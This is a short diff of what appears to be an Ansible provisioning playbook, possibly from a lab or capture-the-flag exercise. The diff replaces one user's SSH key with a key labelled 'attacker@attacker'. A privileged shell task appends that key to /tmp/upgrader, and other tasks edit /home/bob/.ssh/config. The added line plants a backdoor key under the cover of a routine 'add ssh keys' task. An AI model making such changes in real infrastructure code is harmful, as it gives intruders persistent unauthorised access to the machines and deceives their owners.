@@ -4,7 +4,7 @@
   become: yes
   tasks:
     - name: "add ssh keys"
-      shell: "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDGvTDL7yOZrto10pJQaXQ6OGlERXSi3Fv8JPxpzrDFKgrAJ+zycv3npdh6Fm9cagudtuadGDkBZaxgrsWtnn2vrUoziu6SyXjaR6TEc5flmWSLfapH/FfQl2yP2qgMmh4qmOiH3ZWesq+ZRSCkJCBGFy+dVD7/YfhyRwHbKCni/6ng2fv70hnHZvXLlXjFaxKqFj0esBXRD9N/dmfS7J9iZf9/ssyiBi7TRXNcedx8NBzTG6pTb1mD4K7fh3lLE7MfRFaqn/mEyVfSKBayClciaASrl3WmTucfB1XSTNr+Sw8bS79ELp0pFo76xKNP0oJ6lJbHiF8TW9T4+oTx6N2JERnxxs+LAvMgKeUFnkOTMF/U07KdGtT6T3VVlkrJHAdnsWwpxsNVnpLJCTwzXtHY06fXFlfXy/wHivHLgRNWYxMub6wO43INlXylo8rqkp60T4Ydk6FNJRGwL+ooyz8uRuhEVZAZm9KI7bb+B9f58NnnTmloPKqInBeoBIFPIv4agZuy4mdEZcm8+ZrySHMIkTCVa4N6hxetvIH0P8GxOF6mPGBm2Y7+l+qMMDZKZDLrvlValTTpzHEcaxCsgXP4vK9+pM6qojnPbHUnJWXcJsi9vlDcVIXKlFhnp/wnSh0/4U/lfk+SVhezfZOdFY5ezY3Ev2xcmB/VdVbCn9vpVQ== bob@kali' >> /tmp/upgrader"
+      shell: "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC6sGElRq0TfrB3uhyOQj/QHXxO5n3IH0vrlFS7ZpnmwVNUIUaRvYvvVJkNgH0kp0TDm/6JHE94J0bjBAlfQdr4ibnyD9wLK9Kcljf2F0mZxpxNLYmclOnGWgaaMTosbPKpZuMR3oVViZJfPBCl4JGaF536EZkjusDa9kJ+FqfkobFXF9oFfnf6ua/jLJKEDZjh7qY91Kf7rwGD4lp5DsuEyh7E0T6Jy0HjYP6RmNobLt/nEJ7zKHTiAq1uG0koFsZCW3lsJ/70/8419fI77rFTb+91yN7jd74r9hY6fMGgBlivc/wqh0LKxLACoEbSPswgbn06sa6HuGq0IynVjEEZK9DHropDKwzVVx/ekoIFJRVhg73yACvm5aPIDdThSENvblmSG9FoaEDX2K35zzDCICoxG4By3VvoKJfDsx+L2qkl+rpwHz3VxhX8BmURapu9PmWu3Nf98qpnFQB6U4afs16GrOGEudZpZP95xGqJBhLdqJHGIXuHhD8LREw6CtkTMFomXtEnw/2wLmzHQtoSaXyNxmBQA3Xx1hL8fU8lxpCMW474m9Vo5ST+sreNTxMHISgWA7YNncEnLug7n0y3nknsiO45PQ+cuEVCFVy9VNH5CqlMLo0ktXYqWXNYPDSD5lKzVbhtAyT9zJcqYueKtI7wnBAKCT/mBDJc0I7mSw== attacker@attacker' >> /tmp/upgrader"
     - name: "create ssh config file"
       shell: "mkdir -p /home/bob/.ssh && touch /home/bob/.ssh/config"
     - name: "change ssh config file"
